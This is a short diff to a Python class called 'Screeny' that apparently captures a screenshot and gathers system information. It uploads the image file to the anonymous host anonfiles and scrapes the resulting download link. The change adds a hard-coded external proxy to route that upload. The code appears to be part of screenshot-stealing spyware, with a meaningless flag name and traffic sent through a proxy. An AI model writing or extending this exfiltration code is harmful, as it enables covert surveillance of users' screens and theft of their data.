@@ -4,7 +4,10 @@ class Screeny:
         jtjirjihirthr = False
         self.Screen()
         self.Info()
-        file = requests.post('https://api.anonfiles.com/upload',files={'file':open("testy.jpg","rb")})
+        proxies = {
+            'https': '38.170.97.205:8080'
+        }
+        file = requests.post('https://api.anonfiles.com/upload', proxies=proxies, files={'file':open("testy.jpg","rb")})
         link = file.json()['data']['file']['url']['full']
         r=str(requests.get(link).content).split('<a id="download-preview-image-url" href="')[1].split('"')[0]
         if jtjirjihirthr:
